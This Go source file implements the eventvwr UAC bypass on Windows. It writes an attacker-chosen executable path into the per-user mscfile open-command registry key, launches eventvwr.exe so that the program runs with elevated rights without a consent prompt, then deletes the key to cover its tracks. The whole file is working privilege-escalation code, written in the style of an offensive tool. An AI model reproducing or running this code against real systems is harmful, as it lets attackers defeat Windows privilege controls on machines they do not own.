package models

import (
	"fmt"
	"time"

	"golang.org/x/sys/windows/registry"
)

func Eventvwr_registry(File_path string) {
	fmt.Println(Version())
	subkey, _, err := registry.CreateKey(registry.CURRENT_USER, `Software\Classes\mscfile\Shell\open\command`, registry.SET_VALUE|registry.QUERY_VALUE)
	if err != nil {
		fmt.Printf("[-] CreateKey err: %v", err)
		return
	}
	subkey.SetStringValue("", File_path)
	/*
		if err != nil {
			fmt.Printf("[-] SetValue err: %v", err)
			return
		}
	*/
	subkey.Close()
	WindowsRun("C:\\windows\\system32\\eventvwr.exe")
	time.Sleep(time.Second * 3)
	DeleteSubKeyTree("mscfile")
	fmt.Println("[+] Ev Done")
}
